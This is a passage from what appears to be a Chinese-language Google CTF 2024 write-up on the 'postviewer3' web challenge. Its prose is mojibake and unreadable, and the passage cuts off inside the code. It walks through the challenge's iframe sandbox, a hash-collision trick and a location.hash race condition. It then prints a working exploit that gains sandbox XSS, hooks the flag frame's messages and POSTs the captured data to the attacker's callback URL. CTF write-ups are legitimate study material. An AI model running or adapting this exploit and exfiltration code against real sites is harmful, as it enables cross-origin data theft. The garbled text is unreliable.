punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>source <span class="token operator">!==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">throw</span> <span class="token operator">/</span>not parent<span class="token operator">/</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>eval<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token function">eval</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>eval<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        parent<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'loader ready'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">      <span class="token selector">body</span><span class="token punctuation">&#123;</span>        <span class="token property">padding</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>        <span class="token property">margin</span><span class="token punctuation">:</span> 0px<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token selector">iframe</span><span class="token punctuation">&#123;</span>        <span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> 100vh<span class="token punctuation">;</span>        <span class="token property">border</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token selector">.spinner</span> <span class="token punctuation">&#123;</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://storage.googleapis.com/gctf-postviewer/spinner.svg<span class="token punctuation">)</span></span> center no-repeat<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token selector">.spinner iframe</span><span class="token punctuation">&#123;</span>        <span class="token property">opacity</span><span class="token punctuation">:</span> 0.2      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>spinner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› æ­¤ï¼Œé€™æ™‚ iframe çš„å…§å®¹æœƒè®Šæˆä¸Šé¢çš„ HTMLï¼Œå°±åªæ˜¯ eval å‚³å…¥çš„åƒæ•¸è€Œå·²ã€‚</p><p>è€Œæœ€å¾Œä¸€æ­¥ï¼Œæœƒå‘é€™å€‹ iframe postMessageï¼ŒæŠŠæª”æ¡ˆçš„å…§å®¹è·Ÿ mimeType å¸¶ä¸Šï¼Œç„¶å¾Œ eval åº•ä¸‹é€™ä¸€æ®µç¨‹å¼ç¢¼ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> container <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#container"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>container<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">type</span><span class="token operator">:</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>type<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  iframe<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>  container<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">'spinner'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    container<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">'spinner'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æœ€å¾Œåœ¨é€™å€‹ iframe è£¡é¢åˆæœƒæœ‰ä¸€å€‹ sandboxed iframeï¼Œæª”æ¡ˆçš„å…§å®¹å°±åœ¨è£¡é¢ã€‚</p><p>æ˜¯ä¸æ˜¯å¾ˆè¤‡é›œï¼Ÿæˆ‘ç•¶åˆååè¦†è¦†çœ‹äº†å¹¾éæ‰ææ‡‚æ•´å€‹æµç¨‹åœ¨å¹¹å˜›ï¼Œé‚„é †æ‰‹ç•«äº†ä¸€å¼µç¤ºæ„åœ–ï¼š</p><p><img src="/img/google-ctf-2024-writeup/p2.png" alt="flow"></p><p>åœ¨è§£é€™é¡Œçš„æ™‚å€™ï¼Œæˆ‘ä¸€é–‹å§‹åœ¨æƒ³é€™äº› onmessage èƒ½ä¸èƒ½è¢«æ”»ç ´ï¼Œä½†æƒ³äº†ä¸€ä¸‹ä¹‹å¾Œç™¼ç¾æ²’è¾¦æ³•ã€‚</p><p>å› ç‚ºæ‰€æœ‰çš„ iframe éƒ½æœ‰å° source.origin åšé©—è­‰ï¼Œå› æ­¤æ²’æœ‰è¾¦æ³•å¾ä¸åˆæ³•çš„ origin å‚³è¨Šæ¯é€²å»ã€‚è€Œå¦ä¸€æ–¹é¢ï¼Œå¾ˆæ˜é¡¯çš„æˆ‘å€‘å¯ä»¥æ‹¿åˆ°æŸäº› sandbox çš„ XSSï¼Œåªè¦æ‹¿è‡ªå·±çš„ origin ç®—å‡º hash å³å¯ã€‚</p><p>ä½†æ˜¯æ‹¿ä¸€å€‹éš¨æ©Ÿçš„ sandbox XSS æ˜¯æ²’ç”¨çš„ï¼Œæˆ‘å€‘æœ‰æ²’æœ‰å¯èƒ½æ‹¿åˆ°å«æœ‰ flag çš„ sandbox domain çš„ XSSï¼Ÿ</p><p>ç”¢ç”Ÿ domain çš„ hash ç”±åº•ä¸‹å››å€‹å…ƒç´ çµ„æˆï¼š</p><ol><li>bodyï¼ˆå›ºå®šï¼‰</li><li>productï¼ˆå›ºå®šï¼‰</li><li>window.originï¼ˆå›ºå®šï¼‰</li><li>location.hrefï¼ˆæœƒåŒ…å« hashï¼Œä½†æˆ‘å€‘ä¸çŸ¥é“ hash å…§å®¹ï¼‰</li></ol><p>æˆ‘ç¬¬ä¸€å€‹æƒ³æ³•æ˜¯ï¼Œèƒ½ä¸èƒ½è®“ç¨‹å¼ç¢¼åŸ·è¡Œåˆ°é€™ä¸€æ®µæ™‚ï¼Œè®“ location.hash è®Šå›ç©ºçš„ï¼Œé€™æ¨£æ‰€æœ‰çš„å…§å®¹éƒ½å·²çŸ¥ï¼Œå°±å¯ä»¥ç®—å‡º hashã€‚</p><p>è™•ç† hash çš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">processHash</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  safeFrameModal<span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> hash <span class="token operator">=</span> location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>hash<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">;</span>    location<span class="token punctuation">.</span>hash <span class="token operator">=</span> filesList<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">.</span>id<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> fileDiv <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fileDiv <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span>fileDiv<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  previewIframeDiv<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">previewFile</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span>fileDiv<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span> previewIframeDiv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* If modal is not shown remove hash */</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>previewModalDiv<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'show'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      location<span class="token punctuation">.</span>hash <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> processHash<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸­é–“æœ‰ä¸€å€‹ <code>await sleep(0)</code> è®“å¾ŒçºŒçš„æ“ä½œè®ŠæˆéåŒæ­¥ï¼Œæ‰€ä»¥ç†è«–ä¸Šå¯ä»¥ race condition ä¸€ä¸‹ï¼Œè®“é€™ä¸€æ®µæ‹¿åˆ°çš„ hash æ˜¯ <code>#0</code> ç„¶å¾Œè®Šæˆ flag file idï¼Œä½†ä¹‹å¾Œè·‘åˆ° <code>previewFile</code> æ™‚ï¼Œ<code>location.hash</code> è®Šæˆ <code>#</code>ã€‚</p><p>ä¸éå¾Œä¾†æˆ‘æƒ³äº†æƒ³ï¼Œé€™æ¨£ä¹Ÿæ˜¯æ²’ç”¨çš„ï¼Œå› ç‚º trust origin é‚„æ˜¯é¡Œç›®çš„ domainï¼Œå°±ç®—çŸ¥é“äº† hashï¼Œæˆ‘ä¹Ÿæ²’è¾¦æ³•åšä»»ä½•äº‹ã€‚</p><p>ä½†éä¸ä¹…æˆ‘é‡æ–°çœ‹äº†ä¸€æ¬¡ç”¢ç”Ÿ hash çš„ç¨‹å¼ç¢¼ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">calculateHash</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>strings</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> encoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> string <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">await</span> crypto<span class="token punctuation">.</span>subtle<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">"SHA-256"</span><span class="token punctuation">,</span> encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">arrayToBase36</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€™é‚Šå°±åªæ˜¯å°‡å‚³å…¥çš„å››å€‹åƒæ•¸æ‹¼åœ¨ä¸€èµ·è€Œå·²ï¼Œå› æ­¤ä»¥é¡Œç›®ä¾†èªªï¼Œæ¯å€‹åƒæ•¸å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">body: BODYproduct: postviewerorigin: https:&#x2F;&#x2F;postviewer3-web.2024.ctfcompetition.comhref: https:&#x2F;&#x2F;postviewer3-web.2024.ctfcompetition.com&#x2F;#file-sha1-hash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¼å‡ºä¾†çš„çµæœæ˜¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">BODYpostviewer&#123;CHALL_ORIGIN&#125;&#123;CHALL_ORIGIN&#125;&#x2F;#file-sha1-hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‡å¦‚æˆ‘å€‘çœŸçš„å¯ä»¥æ§åˆ¶ hash çš„è©±ï¼Œå¯ä»¥è®Šæˆé€™æ¨£ï¼š</p><pre class="line-numbers language-none"><code class="language-none">BODYpostviewer&#123;CHALL_ORIGIN&#125;&#123;CHALL_ORIGIN&#125;&#x2F;#postviewerhttps:&#x2F;&#x2F;example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æ­¤ä¸€ä¾†ï¼Œåº•ä¸‹çš„è¼¸å‡ºå°±æœƒç®—å‡ºä¸€å€‹ç›¸åŒçš„çµæœï¼š</p><pre class="line-numbers language-none"><code class="language-none">body: BODYpostviewer&#123;CHALL_ORIGIN&#125;&#123;CHALL_ORIGIN&#125;&#x2F;#product: postviewerorigin: https:&#x2F;&#x2F;example.comhref: &#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ™‚çš„ origin å·²ç¶“è®Šæˆäº†æˆ‘å€‘è‡ªå·±çš„ domainï¼Œå› æ­¤å°±å¯ä»¥å½é€ å‡ºä¸€å€‹ç›¸åŒ hash çš„ sandbox domainï¼Œä¸¦ä¸” trust origin æ˜¯æˆ‘å€‘è‡ªå·±ã€‚</p><p>æ‹¿åˆ° sandbox XSS ä¹‹å¾Œå°±ç°¡å–®äº†ï¼Œæˆ‘åŸæœ¬çš„æƒ³æ³•æ˜¯æ—¢ç„¶éƒ½æ˜¯ same-origin äº†ï¼Œå°±ç›´æ¥è“‹æ‰ <code>onmessage</code> æˆ–æ˜¯ <code>Blob</code>ï¼Œæ””æˆªä¸€ä¸‹è¼¸å…¥å°±å¥½ï¼Œç•¢ç«Ÿæœ€å¾Œå«æœ‰ flag çš„ iframe æ²’è¾¦æ³•å­˜å–ï¼Œå› ç‚º origin æœƒæ˜¯ nullã€‚</p><p>ç¸½ä¹‹å‘¢ï¼Œæƒ³æ³•å¤§è‡´å¦‚ä¸Šï¼Œä¸éæœ€å›°é›£çš„å°±æ˜¯åˆ°åº•è¦æ€éº¼è§¸ç™¼é€™å€‹ race conditionï¼Œæˆ‘è‡ªå·±çš„ exploit å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>log</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> callbackUrl <span class="token operator">=</span> window<span class="token punctuation">.</span>origin  <span class="token keyword">const</span> evaluatorHtml <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&#123;NOT_IMPORTANT&#125;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">arrayToBase36</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> arr      <span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">calculateHash</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>strings</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> encoder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> string <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">await</span> crypto<span class="token punctuation">.</span>subtle<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'SHA-256'</span><span class="token punctuation">,</span> encoder<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">arrayToBase36</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">padStart</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getSandboxXss</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> selfOrigin <span class="token operator">=</span> window<span class="token punctuation">.</span>origin      <span class="token keyword">const</span> <span class="token constant">PRODUCT</span> <span class="token operator">=</span> <span class="token string">'postviewer'</span>      <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">body</span><span class="token operator">:</span> evaluatorHtml <span class="token operator">+</span> <span class="token string">'postviewerhttps://postviewer3-web.2024.ctfcompetition.comhttps://postviewer3-web.2024.ctfcompetition.com/#'</span><span class="token punctuation">,</span>        <span class="token literal-property property">salt</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">'text/html; charset=utf-8'</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">calculateHash</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>body<span class="token punctuation">,</span> <span class="token constant">PRODUCT</span><span class="token punctuation">,</span> selfOrigin<span class="token punctuation">,</span> data<span class="token punctuation">.</span>salt<span class="token punctuation">)</span><span class="token punctuation">;</span>      log<span class="token punctuation">.</span>innerText <span class="token operator">+=</span> <span class="token string">'hash:'</span> <span class="token operator">+</span> hash      <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>hash<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.postviewer3-web.2024.ctfcompetition.com/postviewer/shim.html?o=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>selfOrigin<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>      <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span>      iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url      iframe<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>          iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">eval</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">fetch('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>callbackUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/step_1_xss');                        let stop = false            for(let i=1; i&lt;=3; i++) &#123;              fetch('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>callbackUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/open_' + i)              let win = window.open("https://postviewer3-web.2024.ctfcompetition.com/")                            setTimeout(() => &#123;                setInterval(function() &#123;                  if (stop) return                  win.location = "https://postviewer3-web.2024.ctfcompetition.com/#0"                &#125;, 2)                setInterval(function()&#123;                  if (stop) return                  win.location = "https://postviewer3-web.2024.ctfcompetition.com/#postviewer</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>window<span class="token punctuation">.</span>origin<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"                &#125;, 6)                setInterval(function() &#123;                  if (stop) return                  try &#123;                    win.frames[0].origin                    stop = true                                        fetch('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>callbackUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/correct_sandbox')                    win.frames[0].onmessage = function(e) &#123;                      fetch('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>callbackUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/flag', &#123; method: 'POST', body: JSON.stringify(e.data) 